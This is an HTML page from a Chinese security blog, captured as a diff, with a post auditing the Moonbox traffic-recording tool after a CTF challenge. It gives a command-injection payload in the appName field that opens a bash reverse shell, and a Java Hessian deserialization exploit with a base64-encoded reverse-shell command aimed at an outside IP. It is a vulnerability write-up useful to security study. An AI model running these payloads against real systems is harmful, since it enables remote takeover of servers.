@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            moonbox 简单审计
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>d3ctf遇到这题，打完题后对别的点进行了简单审计。</p>
+<p>审计结果：</p>
+<p>1、知道某台机的ssh账密，可以注入命令然后执行。</p>
+<p>2、在不知道本机的账密的情况下，尝试注入命令，注入的命令会被url编码，无法被执行。</p>
+<p>3、存在多处任意的hessian反序列化点。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>版本：最新版，1.2.0，直接使用项目自带的docker</p>
+<p>手动添加调试命令，修改docker-compose.yml即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command: bash -c &quot;/etc/init.d/ssh start; cd /bin; rm sh; ln -s bash sh; java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:5005 -jar /moonbox/moon-box-web&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430080306595.png" alt="image-20240430080306595.png"></p>
+<h2 id="使用源码"><a href="#使用源码" class="headerlink" title="使用源码"></a>使用源码</h2><p>远程环境使用docker，本地debug时用的源码，出现断点对不上的问题。</p>
+<p>比如把断点打在Controller的updateTemplate上，但是运行后，程序确实在updateTemplate方法处停止，但是idea显示的断点在上面。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430081259203.png" alt="image-20240430081259203.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430081346133.png" alt="image-20240430081346133.png"></p>
+<p>猜测jar包不是这份源码编译的。换一种方式搭建</p>
+<h2 id="使用jar包"><a href="#使用jar包" class="headerlink" title="使用jar包"></a>使用jar包</h2><p>把docker环境里的moon-box-web这个jar复制出来，里面的lib也取出来，然后add as library</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430080506724.png" alt="image-20240430080506724.png"></p>
+<p>搭建完后，开始调试，出现了3种情况：</p>
+<p>1、直接打在方法的断点可以被远程识别，而打在方法体里面无法被识别。</p>
+<p>每打一个断点，idea会把断点信息发给远程，远程识别后再发回来，若远程正确识别，则idea的断点符号显示一个勾。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430080710174.png" alt="image-20240430080710174.png"></p>
+<p>2、直接打在方法的断点，程序运行到这会停止，但是idea没有跟踪到断点。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430080758520.png" alt="image-20240430080758520.png"></p>
+<p>3、若把断点打在内部的代码里，即不直接打在Controller，一切正常。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240430080930376.png" alt="image-20240430080930376.png"></p>
+<p>所以就直接这样吧，断点不断在Controller里面就行了。</p>
+<h1 id="命令拼接-远程执行"><a href="#命令拼接-远程执行" class="headerlink" title="命令拼接 远程执行"></a>命令拼接 远程执行</h1><p>首先要大概理解moonbox 流量记录的大概原理：登录到远程机子，下载agent包，运行agent，开始录制。</p>
+<p>新建一个录制</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505140108603.png" alt="image-20240505140108603.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505140147563.png" alt="image-20240505140147563.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505140303315.png" alt="image-20240505140303315.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505140423337.png" alt="image-20240505140423337.png"></p>
+<p>执行该录制时，会登录到远程机子，然后执行命令，调用栈如下：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142018109.png" alt="image-20240505142018109.png"></p>
+<p>startServerAgent先通过getRemoteAgentStartCommand获取要在远程机执行的命令：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142047273.png" alt="image-20240505142047273.png"></p>
+<p>可以看到这里有个命令拼接，appName参与了拼接，这个东西可控。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142318906.png" alt="image-20240505142318906.png"></p>
+<p>然后继续执行，就是ssh登录，然后执行命令。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240429221334507.png" alt="image-20240429221334507.png"></p>
+<p>接下来尝试注入命令。</p>
+<p>正常情况下appName只有这两个选项</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142415645.png" alt="image-20240505142415645.png"></p>
+<p>但是抓包可以手动修改，把原来的appName修改为<code>&quot;;/bin/bash -c &#39;/bin/bash -i &gt;&amp;/dev/tcp/192.168.109.1/16666 0&gt;&amp;1&#39;;&quot;</code></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142743938.png" alt="image-20240505142743938.png"></p>
+<p>此时再查看这个模板，成功修改</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142814438.png" alt="image-20240505142814438.png"></p>
+<p>然后在这个模板下新建录制，appName就是注入的命令了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142941949.png" alt="image-20240505142941949.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505142958557.png" alt="image-20240505142958557.png"></p>
+<h1 id="命令拼接-本地执行"><a href="#命令拼接-本地执行" class="headerlink" title="命令拼接 本地执行"></a>命令拼接 本地执行</h1><p>上述执行方式条件是知道本地机或远程机的ssh账密，有点鸡肋，能不能在不知道本地机的账密的情况下打？</p>
+<p>调用栈入口处startAgent，有两个选项，一个是startServerAgent，一个是startLocalAgent，有没有办法走local？</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505143236843.png" alt="image-20240505143236843.png"></p>
+<p>往上追踪后，发现，只要把数据包的runEnv选项改为local即可。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505143557253.png" alt="image-20240505143557253.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505143627551.png" alt="image-20240505143627551.png"></p>
+<p>直接打打不通，看看构造命令部分</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505143744512.png" alt="image-20240505143744512.png"></p>
+<p>翻译一下就是，appName必须要在本地jvm进程里。因此无法注入。</p>
+<p>看看别的变量，比如taskConfig，往上追踪</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505144218457.png" alt="image-20240505144218457.png"></p>
+<p>这两个变量也是可控的。</p>
+<p>新建一个正常的模板，然后把这两个选项修改。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505144529871.png" alt="image-20240505144529871.png"></p>
+<p>然后再在这个模板下运行录制</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505144643338.png" alt="image-20240505144643338.png"></p>
+<p>可以看到命令成功注入，但是会经过url编码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505144824086.png" alt="image-20240505144824086.png"></p>
+<p>最终的command。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505144905477.png" alt="image-20240505144905477.png"></p>
+<p>因此无法注入可执行的命令了。</p>
+<h1 id="别的命令执行"><a href="#别的命令执行" class="headerlink" title="别的命令执行"></a>别的命令执行</h1><p>查找javaCommandExecute使用的地方</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240429231536340.png" alt="image-20240429231536340.png"></p>
+<p>有一处installAgent，但是变量都不可控。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240429231610571.png" alt="image-20240429231610571.png"></p>
+<p>命令执行已死。</p>
+<h1 id="hessian反序列化"><a href="#hessian反序列化" class="headerlink" title="hessian反序列化"></a>hessian反序列化</h1><p>序列化和反序列化是用来通信过程中传输对象的，而大概了解moonbox工作原理后，知道server和agent之间需要通信，那么存在反序列化点就变得合理起来。</p>
+<p>反序列化点有很多，以该处说明：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505145313314.png" alt="image-20240505145313314.png"></p>
+<p>直接一个裸的反序列化，但是要求是RecordWrapper类型。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505145355186.png" alt="image-20240505145355186.png"></p>
+<p>相关的类：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505145518604.png" alt="image-20240505145518604.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505145646348.png" alt="image-20240505145646348.png"></p>
+<p>payload构造方法：</p>
+<p>有两种方式，但本质上都是一样，都是想办法往RecordWrapper里塞一个Map对象。</p>
+<p>第一种：RecordWrapper的entranceInvocation设置为HttpInvocation，HttpInvocation的headers设置为恶意map即可。</p>
+<p>第二种：创建一个list，这个list里放一个恶意map，然后把这个list赋给RecordWrapper的subInvocations，忽略泛型。</p>
+<p>下面是第一种的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">      new AgentLoader(&quot;POC&quot;).loadAgent(&quot;E:\\ideaProjects\\Java-useful-agents\\Jackson\\target\\Jackson-agentmain.jar&quot;);</span><br><span class="line">      POJONode node1 = new POJONode(Gadget.getPOJONodeStableProxy(Gadget.getTemplatesImpl(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMC43Ni4xMTguMjAyLzE2NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)));</span><br><span class="line">      POJONode node2 = new POJONode(Gadget.getSingnedObject(node1));</span><br><span class="line"></span><br><span class="line">      HashMap hashMapXString = Gadget.get_HashMap_XString(node2);</span><br><span class="line"></span><br><span class="line">      RecordWrapper recordWrapper = new RecordWrapper();</span><br><span class="line">      HttpInvocation invocation = new HttpInvocation();</span><br><span class="line">      invocation.setHeaders(hashMapXString);</span><br><span class="line">      recordWrapper.setEntranceInvocation(invocation);</span><br><span class="line"></span><br><span class="line">      SerializerFactory factory = new SerializerFactory();</span><br><span class="line">      factory.setAllowNonSerializable(true);</span><br><span class="line"></span><br><span class="line">      byte[] serialize = serialize(recordWrapper, factory);</span><br><span class="line">      System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  public static &lt;T&gt; byte[] serialize(T t,SerializerFactory factory) &#123;</span><br><span class="line">      byte[] data = null;</span><br><span class="line">      try &#123;</span><br><span class="line">          Hessian2Output output = new Hessian2Output();</span><br><span class="line">          output.setSerializerFactory(factory);</span><br><span class="line">          output.writeObject(t);</span><br><span class="line">          data = (byte[])Util.getFieldValue(output,&quot;_buffer&quot;);</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      return data;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发包</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505151300016.png" alt="image-20240505151300016.png"></p>
+<p>查看调用栈，反序列化链正常</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/moonbox/image-20240505150759501.png" alt="image-20240505150759501.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%BA%90%E7%A0%81"><span class="toc-text">使用源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8jar%E5%8C%85"><span class="toc-text">使用jar包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-text">命令拼接 远程执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5-%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C"><span class="toc-text">命令拼接 本地执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%AB%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">别的命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">hessian反序列化</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
